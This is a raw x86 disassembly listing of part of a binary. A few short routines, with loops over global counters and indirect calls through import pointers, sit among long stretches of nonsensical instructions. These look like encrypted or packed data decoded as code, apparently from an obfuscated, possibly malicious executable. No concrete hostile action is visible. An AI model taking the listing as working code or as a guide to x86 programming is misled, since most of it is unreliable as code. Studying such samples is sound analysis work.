  412099:	mov    ?,WORD PTR [edi+eiz*8-0x2]
  41209d:	add    DWORD PTR [ecx+ebp*8+0x3],edi
  4120a1:	and    cl,BYTE PTR [esi-0x32c5067e]
  4120a7:	xchg   DWORD PTR [ecx-0x75],ebp
  4120aa:	inc    ebp
  4120ab:	or     BYTE PTR [ebx+0x240d8b00],cl
  4120b1:	mov    dl,0x41
  4120b3:	add    BYTE PTR [ecx],al
  4120b5:	or     BYTE PTR [esi+0x5d],bl
  4120b8:	ret    0x8
  4120bb:	push   ebp
  4120bc:	mov    ebp,esp
  4120be:	sub    esp,0x30
  4120c1:	and    ecx,DWORD PTR ds:0x42fdf6
  4120c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4120ce:	mov    eax,ds:0x42fd55
  4120d3:	adc    DWORD PTR ds:0x42e76f,eax
  4120d9:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  4120e0:	sbb    DWORD PTR ds:0x42e76b,0x6a34
  4120ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4120ed:	sub    DWORD PTR ds:0x42e783,0x730a
  4120f7:	push   ebx
  4120f8:	mov    DWORD PTR ds:0x42e77b,0x19
  412102:	cmp    DWORD PTR ds:0x42e77b,0x0
  412109:	je     0x412140
  41210f:	cmp    DWORD PTR ds:0x42e77b,0x1e
  412116:	jne    0x41212e
  41211c:	push   0x42fdfe
  412121:	push   0x0
  412123:	push   0x42e2ed
  412128:	call   DWORD PTR ds:0x42e503
  41212e:	mov    ebx,DWORD PTR ds:0x42e77b
  412134:	dec    ebx
  412135:	mov    DWORD PTR ds:0x42e77b,ebx
  41213b:	jmp    0x412102
  412140:	mov    eax,0x7510855
  412145:	xor    ecx,eax
  412147:	sub    ebx,0x2eeb
  41214d:	mov    ebx,0x32729c
  412152:	sbb    DWORD PTR ds:0x42e1a0,0x42fd81
  41215c:	jmp    0x412440
  412161:	mov    edx,0xf222c858
  412166:	mov    dl,0x6a
  412168:	pop    eax
  412169:	dec    eax
  41216a:	xor    bh,0xa0
  41216d:	jne    0x412127
  41216f:	loop   0x412138
  412171:	inc    esi
  412172:	pop    edi
  412173:	jo     0x4121e5
  412175:	mov    ecx,0xf70707e
  41217a:	test   BYTE PTR [ecx+0x771b9c78],bh
  412180:	ficom  DWORD PTR ss:[edi-0x59]
  412184:	ficom  WORD PTR [edx+0x103b08dd]
  41218a:	ds es inc ecx
  41218d:	and    al,0xd0
  41218f:	ins    BYTE PTR es:[edi],dx
  412190:	mov    edx,0x4c9b5da4
  412195:	pusha  
  412196:	xchg   esi,eax
  412197:	in     al,0xc6
  412199:	stos   DWORD PTR es:[edi],eax
  41219a:	mov    esp,0x979dec34
  41219f:	push   ss
  4121a0:	in     al,dx
  4121a1:	add    eax,0x5938cf2b
  4121a6:	or     al,0xc0
  4121a8:	repnz cdq 
  4121aa:	pop    es
  4121ab:	ins    BYTE PTR es:[edi],dx
  4121ac:	popa   
  4121ad:	bound  edi,QWORD PTR [esi]
  4121af:	scas   al,BYTE PTR es:[edi]
  4121b0:	les    esp,FWORD PTR [eax+0x5a]
  4121b3:	mov    cl,0x68
  4121b5:	ins    BYTE PTR es:[edi],dx
  4121b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121b7:	mov    esp,0x61a9bfec
  4121bc:	das    
  4121bd:	jb     0x4121b2
  4121bf:	adc    al,0xe1
  4121c1:	cmp    BYTE PTR [edx+0x4e],cl
  4121c4:	test   BYTE PTR [edi+0x6704c64a],bh
  4121ca:	fsubp  st(1),st
  4121cc:	stos   DWORD PTR es:[edi],eax
  4121cd:	xchg   esp,eax
  4121ce:	sub    al,BYTE PTR ds:0x8489719a
  4121d4:	mov    edi,0x2da02771
  4121d9:	fcom   QWORD PTR [edi+0x28]
  4121dc:	push   edx
  4121dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121de:	xor    ah,0xf0
  4121e1:	cmp    DWORD PTR [ecx+0x45e8235b],ebx
  4121e7:	in     al,0xf3
  4121e9:	jnp    0x412202
  4121eb:	(bad)  
  4121ec:	in     al,dx
  4121ed:	test   ebx,0x3b65f3d0
  4121f3:	out    dx,al
  4121f4:	ins    BYTE PTR es:[edi],dx
  4121f5:	pop    esi
  4121f6:	jbe    0x412221
  4121f8:	scas   eax,DWORD PTR es:[edi]
  4121f9:	nop
  4121fa:	mov    al,0xa
  4121fc:	lods   al,BYTE PTR ds:[esi]
  4121fd:	aaa    
  4121fe:	shr    BYTE PTR ds:0xf3b4d5be,0xb7
  412205:	jg     0x412248
  412207:	or     edx,eax
  412209:	pop    ecx
  41220a:	shl    ebx,0x7b
  41220d:	(bad)  
  41220e:	out    dx,al
  41220f:	add    eax,0xa0a10e6
  412214:	dec    ebx
  412215:	(bad)  
  412216:	xchg   edx,eax
  412217:	dec    ecx
  412218:	ret    0xe6dc
  41221b:	pop    eax
  41221c:	adc    cl,BYTE PTR [ebx-0x20]
  41221f:	stos   BYTE PTR es:[edi],al
  412220:	xlat   BYTE PTR ds:[ebx]
  412221:	sbb    eax,ebx
  412223:	out    0x17,eax
  412225:	and    DWORD PTR [esi+edx*4],ebp
  412228:	pop    ecx
  412229:	mov    dh,0x42
  41222b:	dec    edi
  41222c:	in     al,dx
  41222d:	mov    ecx,0xcf31e04d
  412232:	xor    DWORD PTR [ebp-0x12],esi
  412235:	xchg   edi,eax
  412236:	in     eax,0x70
  412238:	dec    eax
  412239:	mov    edx,0xa3da1e6a
  41223e:	sbb    ecx,edx
  412240:	ss iret 
  412242:	fmul   QWORD PTR [ebp+0x5b]
  412245:	inc    ebx
  412246:	ss jbe 0x4121e0
  412249:	xchg   edx,eax
  41224a:	idiv   BYTE PTR [ecx+0x74]
  41224d:	stos   DWORD PTR es:[edi],eax
  41224e:	pop    ebp
  41224f:	sbb    bh,bh
  412251:	add    dh,BYTE PTR [ebx+0x6]
  412254:	(bad)  
  412256:	sub    esp,eax
  412258:	arpl   WORD PTR [edx],si
  41225a:	in     eax,0x89
  41225c:	mov    ebp,0x984e0a08
  412261:	in     al,dx
  412262:	retf   
  412263:	mov    ebp,0xabb2360b
  412268:	pop    eax
  412269:	add    ecx,DWORD PTR [ebp-0x18]
  41226c:	fcmovnb st,st(3)
  41226e:	call   0x5b7af745
  412273:	inc    edx
  412274:	push   0xffffffc0
  412276:	adc    DWORD PTR [esi+ecx*4-0x5],ebx
  41227a:	idiv   BYTE PTR [edi-0x629fbf49]
  412280:	loope  0x41222c
  412282:	mov    ebx,DWORD PTR ds:0x92f608ac
  412288:	cld    
  412289:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41228b:	retf   0x33a2
  41228e:	cmp    ecx,DWORD PTR [eax+0x12]
  412291:	fs jmp 0x7c3f:0xf3e3c3ec
  412299:	push   esp
  41229a:	pop    es
  41229b:	out    dx,eax
  41229c:	mov    eax,ds:0x55ddf361
  4122a1:	stos   BYTE PTR es:[edi],al
  4122a2:	dec    ebp
  4122a3:	hlt    
  4122a4:	dec    eax
  4122a5:	loop   0x4122dc
  4122a7:	pop    esi
  4122a8:	xchg   esi,eax
  4122a9:	dec    esi
  4122aa:	dec    ecx
  4122ab:	or     BYTE PTR [ebp+0x2d],0x1
  4122af:	out    0xdd,eax
  4122b1:	inc    eax
  4122b2:	push   ecx
  4122b3:	mov    esi,DWORD PTR [esi-0x68]
  4122b6:	pushf  
  4122b7:	lea    ebp,[esi]
  4122b9:	add    BYTE PTR [ebp+0x5a],bl
  4122bc:	scas   eax,DWORD PTR es:[edi]
  4122bd:	mov    eax,ds:0xc433d451
  4122c2:	add    al,0xff
  4122c4:	rcl    DWORD PTR [ebp+0x46bfb941],cl
  4122ca:	enter  0xb826,0x3b
  4122ce:	sub    BYTE PTR [edx+ebx*2+0x22],bh
  4122d2:	lods   al,BYTE PTR ds:[esi]
  4122d3:	sbb    eax,DWORD PTR [edi]
  4122d5:	fdiv   DWORD PTR [edx]
  4122d7:	mov    BYTE PTR [ebx+edi*8+0x9],bl
  4122db:	je     0x412326
  4122dd:	and    DWORD PTR [esi],ecx
  4122df:	sbb    DWORD PTR [eax+0x607c1239],edi
  4122e5:	mov    ch,0xaa
  4122e7:	(bad)  
  4122e8:	xchg   esi,eax
  4122e9:	pop    edx
  4122ea:	ret    0xb382
  4122ed:	fst    QWORD PTR [esi]
  4122ef:	(bad)  
  4122f0:	aas    
  4122f1:	jl     0x4122db
  4122f3:	xchg   BYTE PTR [eax+0x6db48488],dl
  4122f9:	out    dx,eax
  4122fa:	pop    es
  4122fb:	in     eax,0xf6
  4122fd:	sbb    DWORD PTR [ecx],ecx
  4122ff:	scas   eax,DWORD PTR es:[edi]
  412300:	rcr    BYTE PTR [ebp-0x1b],cl
  412303:	fbstp  TBYTE PTR [ebp+ebx*1+0x21a2a59b]
  41230a:	and    ebx,DWORD PTR [ecx-0x50]
  41230d:	call   0x9177dff0
  412312:	dec    edx
  412313:	fidivr WORD PTR [ecx+0x62]
  412316:	test   DWORD PTR [edx+esi*4],ecx
  412319:	add    al,0x99
  41231b:	test   DWORD PTR [ebx],0x2272477c
  412321:	sbb    edx,DWORD PTR [edi+0x6b86b886]
  412327:	daa    
  412328:	mov    eax,0xabcdeae9
  41232d:	jge    0x4122f7
  41232f:	xlat   BYTE PTR ds:[ebx]
  412330:	jg     0x4123a8
  412332:	imul   esi,DWORD PTR [ebp+0x197e21ed],0x7b411181
  41233c:	mov    eax,0xde0a4796
  412341:	leave  
  412342:	pushf  
  412343:	xchg   esi,eax
  412344:	stos   BYTE PTR es:[edi],al
  412345:	minps  xmm1,XMMWORD PTR [edx-0x18]
  412349:	jmp    0x4e53a17b
  41234e:	leave  
  41234f:	push   0xe53ce29
  412354:	xchg   DWORD PTR [ebx+0x5a],esi
  412357:	enter  0xd76a,0xd
  41235b:	push   ds
  41235c:	ret    0x5b47
  41235f:	and    BYTE PTR [eax],al
  412361:	into   
  412362:	outs   dx,BYTE PTR ds:[esi]
  412363:	idiv   BYTE PTR [ebp+0x48966149]
  412369:	cld    
  41236a:	push   es
  41236b:	ret    
  41236c:	dec    ebp
  41236d:	xor    BYTE PTR [ecx-0x34],bh
  412370:	mov    DWORD PTR [edx],eax
  412372:	ret    
  412373:	adc    ebp,ecx
  412375:	pop    edi
  412376:	icebp  
  412377:	mov    DWORD PTR [esi+0x2013edcc],edi
  41237d:	mov    bh,0x67
  41237f:	lea    edx,[eax+0x2db45106]
  412385:	mov    ch,0x6c
  412387:	(bad)  
  412388:	cld    
  412389:	call   0xf42a5a57
  41238e:	out    0x8b,eax
  412390:	int3   
  412391:	adc    BYTE PTR [edx-0x57],ch
  412394:	enter  0x57a4,0x3c
  412398:	jo     0x4123b7
  41239a:	mov    eax,DWORD PTR [esi]
  41239c:	adc    al,0xb3
  41239e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41239f:	cmp    al,0x78
  4123a1:	or     al,BYTE PTR [esi+eax*8+0x5d]
  4123a5:	dec    ebp
  4123a6:	lea    ebx,[edx-0x2199898b]
  4123ac:	int    0xa1
  4123ae:	or     ebp,DWORD PTR [ecx+0x11be4d29]
  4123b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123b5:	cs scas al,BYTE PTR es:[edi]
  4123b7:	fisttp QWORD PTR [ecx-0x78ac7243]
  4123bd:	dec    ch
  4123bf:	inc    ebp
  4123c0:	xchg   edi,eax
  4123c1:	ja     0x41237d
  4123c3:	xor    eax,0xd6c4cf22
  4123c8:	add    DWORD PTR [ecx+0x59],eax
  4123cb:	xchg   edx,eax
  4123cc:	jl     0x4123ae
  4123ce:	xchg   ecx,eax
  4123cf:	mov    edi,0xb08b70c4
  4123d4:	pop    es
  4123d5:	xchg   esp,eax
  4123d6:	ss stos DWORD PTR es:[edi],eax
  4123d8:	fdivr  st(4),st
  4123da:	out    dx,eax
  4123db:	hlt    
  4123dc:	fimul  WORD PTR [ebx]
  4123de:	mov    esp,0xd53e0c4c
  4123e3:	push   ebx
  4123e4:	aam    0x90
  4123e6:	out    dx,al
  4123e7:	mov    gs,WORD PTR ds:0xe7ffd42a
  4123ed:	outs   dx,DWORD PTR ds:[esi]
  4123ee:	xor    esi,ebx
  4123f0:	push   es
  4123f1:	inc    edx
  4123f2:	cld    
  4123f3:	mov    edi,0x9c4b5ca8
  4123f8:	cmp    ebp,DWORD PTR [esi+0x21]
  4123fb:	jl     0x4123b0
  4123fd:	pop    edi
  4123fe:	push   edi
  4123ff:	outs   dx,DWORD PTR ds:[esi]
  412400:	imul   ecx,DWORD PTR [ebx-0x6c7d22ee],0x44654bd8
  41240a:	mov    bh,0x6d
  41240c:	mov    dl,0x5a
  41240e:	push   ebx
  41240f:	xchg   ebp,eax
  412410:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412411:	ret    
  412412:	adc    ecx,DWORD PTR [edi+0x73dfa132]
  412418:	fdiv   DWORD PTR [eax+eiz*8+0x14775180]
  41241f:	rol    eax,0xc7
  412422:	mov    edi,0xa2c8bf28
  412427:	data16 fwait
  412429:	test   BYTE PTR [esi+0x5c444a5e],ch
  41242f:	adc    eax,0x3b8c5d5f
  412434:	ror    al,cl
  412436:	and    DWORD PTR [esp+eax*8-0x1130fb30],ebp
  41243d:	ret    
  41243e:	adc    ebp,eax
  412440:	add    ecx,ebx
  412442:	sub    DWORD PTR ds:0x42fd79,0xf96
  41244c:	jmp    0x412730
  412451:	hlt    
  412452:	xor    BYTE PTR [ebx+edi*8+0x74],bl
  412456:	fwait
  412457:	repz ja 0x41244c
  41245a:	inc    ecx
  41245b:	xchg   ecx,eax
  41245c:	aaa    
  41245d:	mov    al,0x9b
  41245f:	sub    DWORD PTR [esi+0x70705c8f],0x70707eb9
  412469:	sti    
  41246a:	mov    dl,bh
  41246c:	je     0x4124de
  41246e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41246f:	popa   
  412470:	pop    ss
  412471:	dec    esi
  412472:	das    
  412473:	mov    eax,0x9a35342c
  412478:	lahf   
  412479:	pusha  
  41247a:	ret    0x4bc1
  41247d:	cmp    al,0xc7
  41247f:	or     ah,dl
  412481:	shr    BYTE PTR [edx],1
  412483:	pop    ecx
  412484:	mov    eax,0x4633ee5f
  412489:	push   ebx
  41248a:	adc    eax,0xcdadf1e7
  41248f:	repnz mov cl,0x73
  412492:	(bad)  
  412493:	out    dx,al
  412494:	pop    ebp
  412495:	retf   
  412496:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412497:	inc    edi
  412498:	pop    ds
  412499:	jmp    0x7034a06c
  41249e:	out    dx,eax
  41249f:	(bad)  
  4124a0:	imul   esi,esp,0x3c
  4124a3:	mov    ds:0xed86dc8c,al
  4124a8:	pop    ds
  4124a9:	out    0x43,al
  4124ab:	dec    edx
  4124ac:	in     eax,dx
  4124ad:	sub    DWORD PTR [esi],edx
  4124af:	xor    DWORD PTR [eax],0xae4a4842
  4124b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124b6:	mov    ecx,0x65e16a5e
  4124bb:	std    
  4124bc:	retf   
  4124bd:	in     al,0xb3
  4124bf:	sub    al,0xcb
  4124c1:	pop    esp
  4124c2:	js     0x412522
  4124c4:	out    dx,eax
  4124c5:	jns    0x412458
  4124c7:	outs   dx,DWORD PTR ds:[esi]
  4124c8:	jo     0x41244d
  4124ca:	sub    al,0x1f
  4124cc:	mov    esi,0x460b4ea1
  4124d1:	xor    BYTE PTR [edi-0x68d5858e],ah
  4124d7:	lds    esi,FWORD PTR [esi+0x23]
  4124da:	aaa    
  4124db:	sub    DWORD PTR [ebp-0x54],edi
  4124de:	jg     0x412495
  4124e0:	jbe    0x4124cc
  4124e2:	adc    al,0x38
  4124e4:	call   0x3f7a:0xebc15960
  4124eb:	lods   eax,DWORD PTR ds:[esi]
  4124ec:	and    al,0x98
  4124ee:	pop    ebx
  4124ef:	pop    ss
  4124f0:	cmp    eax,0x5ac3f3a7
  4124f5:	jecxz  0x4124f4
  4124f7:	test   bl,cl
  4124f9:	and    DWORD PTR [esi],eax
  4124fb:	ficomp WORD PTR [ecx+0x43]
  4124fe:	jmp    0xc253:0x6d49ee54
  412505:	adc    al,0x5f
  412507:	push   ecx
  412508:	mov    edi,ebx
  41250a:	and    BYTE PTR [edx],ah
  41250c:	test   BYTE PTR [esi+0x7],cl
  41250f:	cmp    eax,0xbb5004be
  412514:	push   0xe1aa8bd8
  412519:	out    dx,al
  41251a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41251b:	xor    bh,dh
  41251d:	xchg   edx,eax
  41251e:	push   ecx
  41251f:	enter  0x501,0x0
  412523:	aam    0xf3
  412525:	ror    bh,0xe8
  412528:	mov    fs,WORD PTR [edi]
  41252a:	addr16 and al,0x39
  41252d:	jnp    0x41253a
  41252f:	inc    ecx
  412530:	inc    edx
  412531:	sub    DWORD PTR [esi-0x21],eax
  412534:	aam    0x36
  412536:	bnd ret 0x5aab
  41253a:	jmp    0x4125b9
  41253c:	(bad)  
  41253e:	pop    eax
  41253f:	daa    
  412540:	mov    edi,0xa165e134
  412545:	mov    al,cl
  412547:	mov    ecx,0x19ace86b
  41254c:	repnz mov bl,0x14
  41254f:	je     0x412522
  412551:	mov    al,0x5a
  412553:	mov    al,0x65
  412555:	jo     0x412581
  412557:	neg    dl
  412559:	pop    eax
  41255a:	sub    edi,DWORD PTR [esi-0x5b]
  41255d:	fs inc esi
  41255f:	xchg   ecx,eax
  412560:	std    
  412561:	sub    al,0xd8
  412563:	call   0xc704:0xa1a5cff
  41256a:	pop    esi
  41256b:	ss jmp 0xc56f:0x11af5fdd
  412573:	into   
  412574:	sub    al,0xbd
  412576:	jns    0x4125ab
  412578:	mov    eax,0x609d2254
  41257d:	sar    DWORD PTR [ebx+edi*2],0x14
  412581:	mov    gs,WORD PTR [edi-0x64]
  412584:	or     BYTE PTR [ecx+0x57],0x6f
  412588:	retf   0x23c3
  41258b:	pushf  
  41258c:	aaa    
  41258d:	loopne 0x4125f9
  41258f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412590:	sbb    bh,BYTE PTR [eax+0x3e]
  412593:	push   esp
  412594:	xor    bh,BYTE PTR [ecx]
  412596:	clc    
  412597:	out    0x34,eax
  412599:	in     eax,dx
  41259a:	je     0x412531
  41259c:	cli    
  41259d:	mov    esi,ecx
  41259f:	push   DWORD PTR [ecx]
  4125a1:	popa   
  4125a2:	jp     0x412533
  4125a4:	rcr    DWORD PTR [edx-0x1c],0x7
  4125a8:	loop   0x4125a3
  4125aa:	cdq    
  4125ab:	(bad)  
  4125ac:	aad    0x92
  4125ae:	cld    
  4125af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125b0:	xchg   ecx,eax
  4125b1:	xor    esi,edx
  4125b3:	push   ebx
  4125b4:	jbe    0x412565
  4125b6:	arpl   WORD PTR ds:0xfb1ee8f3,ax
  4125bc:	divps  xmm1,XMMWORD PTR [eax-0x7df8e365]
  4125c3:	add    BYTE PTR [eax+0x15fb453a],bl
  4125c9:	addr16 addr16 pop edx
  4125cc:	imul   ebp,DWORD PTR [esi],0xffffff9f
  4125cf:	or     BYTE PTR [ebp-0x7c],cl
  4125d2:	js     0x4125b4
  4125d4:	or     BYTE PTR [eax+0x30d7a6b3],cl
  4125da:	ds loope 0x4125e0
  4125dd:	pushf  
  4125de:	(bad)  
  4125df:	ror    ch,cl
  4125e1:	push   0xfffffff3
  4125e3:	pushf  
  4125e4:	sbb    BYTE PTR [esi+eiz*4+0x46],dl
  4125e8:	jne    0x41259f
  4125ea:	xchg   ecx,eax
  4125eb:	lea    esp,[ebx+0x4f6162ce]
  4125f1:	mov    bh,0xf2
  4125f3:	pop    esi
  4125f4:	jnp    0x412608
  4125f6:	mul    DWORD PTR [edx+ebp*8]
  4125f9:	fadd   QWORD PTR [ebx-0xf79826a]
  4125ff:	add    bl,dh
  412601:	pop    eax
  412602:	push   ebp
  412603:	sahf   
  412604:	stos   BYTE PTR es:[edi],al
  412605:	cs sahf 
  412607:	inc    esi
  412608:	sub    dl,dl
  41260a:	int3   
  41260b:	repnz std 
  41260d:	pop    ds
  41260e:	cmp    BYTE PTR [ecx+0x68c90f31],dh
  412614:	retf   0x18fc
  412617:	lahf   
  412618:	cwde   
  412619:	jbe    0x41263b
  41261b:	daa    
  41261c:	sbb    BYTE PTR [eax],al
  41261e:	rol    DWORD PTR [eax-0x68c18bfa],1
  412624:	pop    ss
  412625:	pop    ss
  412626:	test   BYTE PTR [esi+esi*2-0x35],0xe5
  41262b:	mov    edi,0xcaea3e3b
  412630:	std    
  412631:	pop    ss
  412632:	test   DWORD PTR [ebx-0x42d4e905],eax
  412638:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412639:	call   0xe56425
  41263e:	or     BYTE PTR [esi],cl
  412640:	(bad)  
  412641:	(bad)  
  412643:	iret   
  412644:	sub    al,0x87
  412646:	pushw  ds
  412648:	dec    eax
  412649:	adc    DWORD PTR [ecx-0x6fd42eb5],edi
  41264f:	push   0xe7ad8c44
  412654:	add    eax,0xa4e11979
  412659:	fiadd  DWORD PTR [esi+0x79]
  41265c:	push   es
  41265d:	ins    BYTE PTR es:[edi],dx
  41265e:	lahf   
  41265f:	pop    eax
  412660:	mov    esp,esp
  412662:	call   0x4d92b90a
  412667:	(bad)  
  412668:	stos   BYTE PTR es:[edi],al
  412669:	mov    esi,0xfca347f0
  41266e:	repz jae 0x41260a
  412671:	std    
  412672:	shl    BYTE PTR [esi+0x170cfbde],1
  412678:	push   edx
  412679:	in     al,dx
  41267a:	cmp    al,0xe4
  41267c:	addr16 jns 0x4126af
  41267f:	jns    0x41269e
  412681:	fisttp QWORD PTR ss:[ebx-0x3f]
  412685:	ret    
  412686:	scas   al,BYTE PTR es:[edi]
  412687:	div    BYTE PTR [ebx]
  412689:	(bad)
  41268c:	inc    edi
  41268d:	pop    eax
  41268e:	add    DWORD PTR [ebp+0x766530e],edi
  412694:	pop    esi
  412695:	pushf  
  412696:	add    eax,0x3f8792aa
  41269b:	clc    
  41269c:	adc    al,0xeb
  41269e:	cmp    DWORD PTR [eax+0x70],ecx
  4126a1:	push   esp
  4126a2:	data16 and bh,BYTE PTR [ebx-0xd160d2a]
  4126a9:	(bad)  
  4126aa:	fmulp  st(5),st
  4126ac:	cs push ss
  4126ae:	mov    ecx,0x8597ea18
  4126b3:	fucom  st(7)
  4126b5:	imul   esp,edx,0xffffffdc
  4126b8:	xor    al,0x9e
  4126ba:	inc    esp
  4126bb:	jo     0x412673
  4126bd:	push   esi
  4126be:	ret    
  4126bf:	push   0xffffffa4
  4126c1:	mov    bl,0xcf
  4126c3:	inc    ecx
  4126c4:	sub    dh,BYTE PTR [eax+edx*1]
  4126c7:	aaa    
  4126c8:	addr16 dec edi
  4126ca:	xchg   ecx,eax
  4126cb:	aas    
  4126cc:	dec    ecx
  4126cd:	retf   
  4126ce:	cs in  al,0x96
  4126d1:	sbb    BYTE PTR [edi+edi*8+0x7849d2ed],dh
  4126d8:	sbb    eax,0x93044770
  4126dd:	fs cmp eax,0x2e6034e3
  4126e3:	ror    DWORD PTR ds:0x1935939b,0xaf
  4126ea:	outs   dx,BYTE PTR ds:[esi]
  4126eb:	ins    DWORD PTR es:[edi],dx
  4126ec:	xchg   esi,eax
  4126ed:	mov    dh,BYTE PTR [ecx]
  4126ef:	inc    edi
  4126f0:	div    BYTE PTR [eax-0x5445b0e5]
  4126f6:	dec    ecx
  4126f7:	loope  0x412749
  4126f9:	data16 in al,0x67
  4126fc:	mov    al,ds:0x27cc88
  412701:	out    dx,eax
  412702:	xor    DWORD PTR [eax],edi
  412704:	mov    ds,WORD PTR [edx+0x9]
  412707:	or     al,0x35
  41270a:	bound  edx,QWORD PTR [eax+edi*8+0x7ee8a882]
  412711:	mov    al,0x23
  412713:	adc    al,0xeb
  412715:	and    eax,0x8a932c5e
  41271a:	das    
  41271b:	pop    esp
  41271c:	mov    ecx,0x25a1bf8e
  412721:	inc    ecx
  412722:	cs leave 
  412724:	cwde   
  412725:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412726:	xlat   BYTE PTR ds:[ebx]
  412727:	fist   WORD PTR [ecx]
  412729:	mov    al,ds:0x429892bc
  41272e:	pop    ebp
  41272f:	mov    bl,0x89
  412731:	dec    ebp
  412732:	in     al,0x81
  412734:	and    eax,0x42fdf6
  412739:	add    BYTE PTR [eax],al
  41273b:	add    BYTE PTR [eax],al
  41273d:	jmp    0x412751
  412742:	xor    ecx,ecx
  412744:	or     ecx,DWORD PTR ds:0x42fdf6
  41274a:	inc    ecx
  41274b:	mov    DWORD PTR ds:0x42fdf6,ecx
  412751:	cmp    DWORD PTR ds:0x42fdf6,0x1c
  412758:	jae    0x41279b
  41275e:	cmp    DWORD PTR ds:0x42fdf6,0x11
  412765:	jne    0x41277c
  41276b:	push   0x5b8f
  412770:	push   DWORD PTR [ebp-0x20]
  412773:	push   DWORD PTR [ebp-0x14]
  412776:	call   DWORD PTR ds:0x42e393
  41277c:	cmp    DWORD PTR ds:0x42fdf6,0x10
  412783:	jne    0x412796
  412789:	mov    ecx,DWORD PTR ds:0x42fdf6
  41278f:	inc    ecx
  412790:	mov    DWORD PTR ds:0x42fdf6,ecx
  412796:	jmp    0x412742
  41279b:	mov    ecx,DWORD PTR [ebp+0x14]
  41279e:	push   esi
  41279f:	xor    DWORD PTR ds:0x42fdee,0x1648
  4127a9:	push   edi
  4127aa:	test   ecx,ecx
  4127ac:	jmp    0x412a90
  4127b1:	mov    ds:0xc112c158,eax
  4127b6:	mov    cl,0x73
  4127b8:	jne    0x4127c0
  4127ba:	jne    0x4127b4
  4127bc:	sub    edi,DWORD PTR [esi+0x73]
  4127bf:	aad    0xcb
  4127c1:	enter  0x7059,0x70
  4127c5:	mov    ecx,0x2b70707e
  4127ca:	outs   dx,BYTE PTR ds:[esi]
  4127cb:	imul   esi,esp,0x15
  4127ce:	jmp    0x41275b
  4127d0:	pop    ebp
  4127d1:	cmp    DWORD PTR [ebp-0x46b4e353],esp
  4127d7:	push   es
  4127d8:	aam    0x83
  4127da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127db:	fldenv [ebx]
  4127dd:	ret    
  4127de:	inc    eax
  4127df:	sub    al,0xef
  4127e1:	mov    ebx,0x939d442
  4127e6:	lds    esi,FWORD PTR [edi]
  4127e8:	out    dx,al
  4127e9:	adc    eax,ebp
  4127eb:	sbb    al,0x9a
  4127ed:	into   
  4127ee:	je     0x412857
  4127f0:	add    DWORD PTR [ecx-0x6],edi
  4127f3:	fst    QWORD PTR [ebp+0x7c]
  4127f6:	fistp  WORD PTR [edi+0x2718fb6c]
  4127fc:	sub    BYTE PTR [ecx+eax*2-0x7d679b41],dh
  412803:	pop    DWORD PTR [ebx+edi*2-0x6]
  412807:	add    al,0x0
  412809:	cdq    
  41280a:	pop    es
  41280b:	dec    edi
  41280c:	js     0x41286a
  41280e:	cmp    ah,BYTE PTR [ebp-0x64c541e8]
  412814:	xchg   ebp,eax
  412815:	pushf  
  412816:	enter  0x452a,0xe0
  41281a:	jb     0x4127fe
  41281c:	sbb    eax,0xbe7772ba
  412821:	mov    ebp,0x7bf5740f
  412826:	jle    0x4127ba
  412828:	pmovmskb esi,mm5
  41282b:	push   es
  41282c:	out    0x8,al
  41282e:	add    edx,ebx
  412830:	(bad)  
  412831:	hlt    
  412832:	adc    cl,ch
  412834:	mul    DWORD PTR [esi]
  412836:	and    eax,DWORD PTR [esi-0x5c8ca36e]
  41283c:	call   0x7635df15
  412841:	test   eax,0x512c3a6d
  412846:	inc    ecx
  412847:	mov    al,0xb0
  412849:	out    0x1c,eax
  41284b:	cmp    al,ah
  41284d:	xchg   edi,eax
  41284e:	jne    0x41280b
  412850:	jl     0x41285a
  412852:	adc    eax,0xb9917f3d
  412857:	jmp    0x7bc19e3c
  41285c:	pop    eax
  41285d:	data16 aad 0x56
  412860:	in     eax,dx
  412861:	jecxz  0x41283c
  412863:	sbb    esp,esp
  412865:	cmp    BYTE PTR ds:0x619a45a2,bh
  41286b:	xchg   ecx,eax
  41286c:	mov    edi,0x7c0b9f3f
  412871:	fnstsw WORD PTR [eax+0x48]
  412874:	les    eax,FWORD PTR [edx+0x132bacb4]
  41287a:	cmc    
  41287b:	outs   dx,BYTE PTR ds:[esi]
  41287c:	cld    
  41287d:	mov    bh,0x52
  41287f:	je     0x4128f6
  412881:	inc    ebx
  412882:	(bad)  
  412883:	xchg   ebp,eax
  412884:	(bad)  
  412885:	sbb    eax,0x17d93f7
  41288a:	jmp    DWORD PTR gs:[ecx-0x77c57ec2]
  412891:	pop    ds
  412892:	add    ah,al
  412894:	aam    0xb
  412896:	and    BYTE PTR [ecx],dl
  412898:	mov    cl,0xfa
  41289a:	mov    dl,0xab
  41289c:	addr16 in eax,dx
  41289e:	pushf  
  41289f:	sahf   
  4128a0:	push   es
  4128a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128a2:	pusha  
  4128a3:	call   0xb5788087
  4128a8:	les    esi,FWORD PTR [esi]
  4128aa:	out    dx,eax
  4128ab:	push   ebp
  4128ac:	cli    
  4128ad:	into   
  4128ae:	mov    al,0xfd
  4128b0:	jl     0x4128ca
  4128b2:	test   al,0x93
  4128b4:	mov    cl,0xd7
  4128b6:	out    dx,al
  4128b7:	out    0x51,eax
  4128b9:	jbe    0x412905
  4128bb:	dec    eax
  4128bc:	fld    QWORD PTR ds:0x1f6a685
  4128c2:	nop
  4128c3:	pusha  
  4128c4:	mov    esp,0x242c8530
  4128c9:	ja     0x41286b
  4128cb:	lds    ebp,FWORD PTR [edi]
